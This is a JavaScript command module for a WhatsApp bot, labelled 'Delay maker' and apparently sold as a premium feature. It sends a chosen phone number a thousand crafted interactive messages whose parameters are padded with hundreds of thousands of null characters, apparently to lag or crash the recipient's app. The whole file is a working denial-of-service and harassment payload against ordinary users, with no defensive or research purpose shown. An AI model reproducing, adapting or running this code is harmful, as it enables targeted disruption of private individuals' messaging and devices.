import { isJidGroup } from "@bayumahadika/baileysx";
import utils from "@bayumahadika/utils";
import chalk from "chalk";

export default {
  description: "Delay maker",
  onlyOwner: false,
  onlyPremium: true,
  handle: async (sock, m) => {
    if (!m.args[0]) return;

    if (isJidGroup(m.args[0]))
      return m.replyError("Hanya support untuk private chat");
    const number = m.args[0]?.replace(/\D/g, "");
    if (!number) return m.replyError("Target dibutuhkan");
    const jid = (await sock.onWhatsApp(`${number}@s.whatsapp.net`))[0]?.jid;
    if (!jid) return m.replyError(`${m.args[0]} tidak terdaftar diwhatsapp`);
    await m.reply(global.mess.spam);
    for (let i = 0; i < 1000; i++) {
      try {
        await utils.sleep(500);
        await sock.relay(
          jid,
          {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  contextInfo: {
                    isForwarded: true,
                    forwardingScore: 1,
                    forwardedNewsletterMessageInfo: {
                      newsletterJid: "120363393482713223@newsletter",
                      newsletterName: `⺞ 𝗡𝗘𝗫𝗕𝗨𝗚 - 𝗦𝗜𝗕𝗔𝗬?`,
                      serverMessageId: 1,
                    },
                    remoteJid: "status@broadcast",
                    participant: "0@s.whatsapp.net",
                    quotedMessage: {
                      interactiveResponseMessage: {
                        body: {
                          format: 1,
                          text: "⺞ 𝗡𝗘𝗫𝗕𝗨𝗚 - 𝗦𝗜𝗕𝗔𝗬?",
                        },
                        nativeFlowResponseMessage: {
                          name: "galaxy_message",
                          paramsJson: `{"screen_1_TextArea_0":"hshsjs","screen_0_TextInput_0":"hallo@gmail.com","screen_0_TextInput_1":"bshs${"\u0000".repeat(
                            510000,
                          )}","screen_0_Dropdown_1":"0_1_-_5","screen_0_CheckboxGroup_2":["0_دعم_العملاء_عبر_واتساب","1_زيادة_المبيعات_باستخدام_واتساب","3_العلامة_الخضراء","2_عقد_شراكة_\\/_أصبح_موزع","4_حظر\\/إيقاف_الحساب","5_شيء_آخر${"\u0000".repeat(
                            510000,
                          )}"],"flow_token":"1:841635371047356:9e9405db7c74caaf750d7f2eebef22fb"}`,
                          version: 3,
                        },
                      },
                    },
                  },
                  body: {
                    text: "*⺞ 𝙒𝙃𝙀𝙍𝙀 𝙄𝙎 𝙎𝙄𝘽𝘼𝙔?*",
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonsParamsJson: "",
                      },
                      {
                        name: "call_permission_request",
                        buttonsParamsJson: "",
                      },
                    ],
                  },
                },
              },
            },
          },
          { participant: { jid } },
        );
        await sock.relayMessage(
          jid,
          {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: global.bot.name,
                  },
                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "",
                      },
                      {
                        name: "call_permission_request",
                        buttonsParamsJson: "",
                      },
                    ],
                  },
                },
              },
            },
          },
          { participant: { jid } },
        );
        console.log(
          `${chalk.bgBlueBright.bold.white(
            `[${i + 1}]. DELAY MAKER`,
          )}: ${chalk.bold(m.args[0])}`,
        );
      } catch (err) {
        console.log(err);
      }
    }
  },
};
